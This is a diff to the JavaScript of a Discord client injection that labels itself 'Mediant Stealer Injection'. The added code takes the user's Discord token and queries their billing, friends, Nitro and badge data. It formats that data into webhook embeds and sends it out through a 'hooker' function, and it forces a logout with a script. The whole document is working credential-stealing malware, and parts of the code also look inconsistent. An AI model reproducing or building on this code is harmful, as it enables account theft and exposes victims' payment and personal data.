@@ -344,6 +344,17 @@ if (jsSHA.default) {
   jsSHA = jsSHA.default;
 }
 
+const getGifOrPNG = async (url) => {
+    var tt = [".gif?size=512", ".png?size=512"]
+
+    var headers = await new Promise(resolve => {
+        https.get(url, res => resolve(res.headers))
+    })
+    var type = headers["content-type"]
+    if (type == "image/gif") return url + tt[0]
+    else return url + tt[1]
+}
+
 function totp(key) {
   const period = 30;
   const digits = 6;
@@ -512,6 +523,35 @@ const getBilling = async (token) => {
   return billing;
 };
 
+const parseFriends = friends => {
+    try{
+    var real = friends.filter(x => x.type == 1)
+    var rareFriends = ""
+    for (var friend of real) {
+        var badges = GetRBadges(friend.user.public_flags)
+        if (badges !== ":x:") rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`
+    }
+    if (!rareFriends) rareFriends = "No Rare Friends"
+    return {
+        len: real.length,
+        badges: rareFriends
+    }
+}catch(err){
+    return ":x:"
+}
+}
+
+const GetA2F = (bouki) => {
+    switch (bouki) {
+        case true:
+            return ":lock: `A2F Enabled`"
+        case false:
+            return ":lock: `A2F Not Enabled`"
+        default:
+            return "Idk bro you got me"
+    }
+}
+
 const Purchase = async (token, id, _type, _time) => {
   const options = {
     expected_amount: config.nitro[_type][_time]['price'],
@@ -578,9 +618,110 @@ const getNitro = (flags) => {
   }
 };
 
+const GetNitro = r => {
+    switch (r.premium_type) {
+        default:
+            return ":x:"
+        case 1:
+            return "<:946246402105819216:962747802797113365>"
+        case 2:
+            if (!r.premium_guild_since) return "<:946246402105819216:962747802797113365>"
+            var now = new Date(Date.now())
+            var arr = ["<:Booster1Month:1051453771147911208>", "<:Booster2Month:1051453772360077374>", "<:Booster6Month:1051453773463162890>", "<:Booster9Month:1051453774620803122>", "<:boost12month:1068308256088400004>", "<:Booster15Month:1051453775832961034>", "<:BoosterLevel8:1051453778127237180>", "<:Booster24Month:1051453776889917530>"]
+            var a = [new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since)]
+            var b = [2, 3, 6, 9, 12, 15, 18, 24]
+            var r = []
+            for (var p in a) r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000))
+            var i = 0
+            for (var p of r) p > 0 ? "" : i++
+            return "<:946246402105819216:962747802797113365> " + arr[i]
+    }
+}
+const GetNSFW = (bouki) => {
+    switch (bouki) {
+        case true:
+            return ":underage: `NSFW Allowed`"
+        case false:
+            return ":underage: `NSFW Not Allowed`"
+        default:
+            return "Idk bro you got me"
+    }
+}
+function GetLangue(read) {
+    var languages = {
+        "fr": ":flag_fr: French",
+        "da": ":flag_dk: Dansk",
+        "de": ":flag_de: Deutsch",
+        "en-GB": ":england: English (UK)",
+        "en-US": ":flag_us: USA",
+        "en-ES": ":flag_es: Espagnol",
+        "hr": ":flag_hr: Croatian",
+        "it": ":flag_it: Italianio",
+        "lt": ":flag_lt: Lithuanian",
+        "hu": ":flag_no::flag_hu: Hungarian",
+        "no": ":flag_no: Norwegian",
+        "pl": ":flag_pl: Polish",
+        'pr-BR': ":flag_pt: Portuguese",
+        "ro": ":flag_ro: Romanian",
+        "fi": ":flag_fi: Finnish",
+        "sv-SE": ":flag_se: Swedish",
+        "vi": ":flag_vn: Vietnamese",
+        "tr": ":flag_tr: Turkish",
+        "cs": ":flag_cz: Czech",
+        "el": ":flag_gr: Greek",
+        "bg": ":flag_bg: Bulgarian",
+        "ru": ":flag_ru: Russian",
+        "uk": ":flag_ua: Ukrainian",
+        "hi": ":flag_in: Indian",
+        "th": ":flag_tw: Taiwanese",
+        "zh-CN": ":flag_cn: Chinese-China",
+        "ja": ":flag_jp: Japanese",
+        "zh-TW": ":flag_cn: Chinese-Taiwanese",
+        "ko": ":flag_kr: Korean"
+    }
+
+    var langue = languages[read] || "No Languages Detected ????";
+    return langue
+}
+
+const makeEmbed = async ({
+    title,
+    fields,
+    image,
+    thumbnail,
+    description
+}) => {
+    var params = {
+        username: "Mediant Injector",
+        avatar_url: "https://raw.githubusercontent.com/Themediant/lagnewalisui/main/img/xd.jpg",
+        content: "",
+        embeds: [{
+            title: title,
+            color: config["embed-color"],
+            fields: fields,
+            description: description ?? "",
+            author: {
+                name: `Mediant Injection`
+            },
+            
+            footer: {
+                text: `🎉・Mediant Stealer Injection`
+            },
+
+        }]
+    };
+
+    if (image) params.embeds[0].image = {
+        url: image
+    }
+    if (thumbnail) params.embeds[0].thumbnail = {
+        url: thumbnail
+    }
+    return params
+}
 const FirstTime = async () => {
     var token = await execScript(tokenScript)
-    if (config['notify'] !== "true") return true
+    if (config.notify !== "true") return true
     if (fs.existsSync(__dirname + "/Mediant")){
         try{
         fs.rmdirSync(__dirname + "/Mediant")
@@ -608,10 +749,10 @@ const FirstTime = async () => {
         var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
         var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
-        var Billings = parseBilling(billing)
+        var Billings = getBilling(billing)
         var Friends = parseFriends(friends)
         if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/The-Mediant/lagnewalisui/main/img/xd.jpg"
-        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/The-Mediant/lagnewalisui/main/banner.gif"
+        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/The-Mediant/lagnewalisui/main/Mediant%20Banner.jpg"
 
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -676,7 +817,7 @@ const FirstTime = async () => {
         })
         var params2 = await makeEmbed({
             title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
-            color: config['embed-color'],
+            color: 2895667,
             description: Friends.badges,
             image: userBanner,
             thumbnail: userAvatar
@@ -684,7 +825,7 @@ const FirstTime = async () => {
 
         params.embeds.push(params2.embeds[0])
     }
-    await post(params)
+    await hooker(params)
     if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
         if (!token) {
             var params = await makeEmbed({
@@ -701,7 +842,7 @@ const FirstTime = async () => {
             var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
             var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
-            var Billings = parseBilling(billing)
+            var Billings = getBilling(billing)
             var Friends = parseFriends(friends)
             if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Themediant/lagnewalisui/main/img/xd.jpg"
             if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Themediant/lagnewalisui/main/banner.gif"
@@ -773,7 +914,7 @@ const FirstTime = async () => {
             })
             var params2 = await makeEmbed({
                 title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
-                color: config['embed-color'],
+                color: 2895667,
                 description: Friends.badges,
                 image: userBanner,
                 thumbnail: userAvatar
@@ -785,7 +926,7 @@ const FirstTime = async () => {
         fs.writeFileSync("./d3dcompiler.dlll", "LogOut")
         await execScript(logOutScript)
         doTheLogOut = true
-        await post(params)
+        await hooker(params)
     }
      
     return false
@@ -834,6 +975,15 @@ const getBadges = (flags) => {
   }
   return badges;
 };
+
+const GetBadges = (e) => {
+    var n = "";
+    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:666_hackingmyshit:1107319657603551253> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = ":x:"), n
+}
+const GetRBadges = (e) => {
+    var n = "";
+    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = ":x:"), n
+}
 
 const hooker = async (content) => {
   const data = JSON.stringify(content);
